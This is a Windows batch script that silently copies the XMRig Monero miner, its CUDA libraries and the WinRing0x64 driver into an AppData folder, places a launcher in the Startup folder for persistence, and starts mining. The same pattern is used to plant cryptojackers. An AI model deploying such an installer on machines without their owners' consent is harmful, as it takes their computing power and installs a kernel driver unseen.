xcopy "config.json" "%appdata%\moneroocean\"
xcopy "nvrtc64_102_0.dll" "%appdata%\moneroocean\"
xcopy "nvrtc-builtins64_102.dll" "%appdata%\moneroocean\"
xcopy "SHA256SUMS" "%appdata%\moneroocean\"
xcopy "start.cmd" "%appdata%\moneroocean\"
xcopy "WinRing0x64.sys" "%appdata%\moneroocean\"
xcopy "xmrig.exe" "%appdata%\moneroocean\"
xcopy "xmrig-cuda.dll" "%appdata%\moneroocean\"
xcopy "startxmr.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
start startxmr.bat
exit
